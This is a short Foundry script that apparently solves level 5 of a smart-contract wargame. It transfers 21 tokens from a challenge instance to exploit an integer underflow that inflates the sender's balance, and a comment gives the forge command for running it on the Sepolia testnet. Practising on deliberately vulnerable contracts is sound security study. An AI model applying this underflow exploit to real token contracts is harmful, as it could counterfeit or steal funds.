// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, IToken} from "../src/level5.sol";

contract Level5Script is Script {
    function run(address instanceAddress) external {
        IToken target = IToken(instanceAddress);

        vm.startBroadcast();
        target.transfer(address(0), 21);
        vm.stopBroadcast();
        uint256 newBalance = target.balanceOf(msg.sender);
        console.log("newBalance: ", newBalance);
    }
}
//forge script script/level5.s.sol:Level5Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account YOUR_KEY --sig "run(address)" YOUR_INSTANCE_ADDRESS
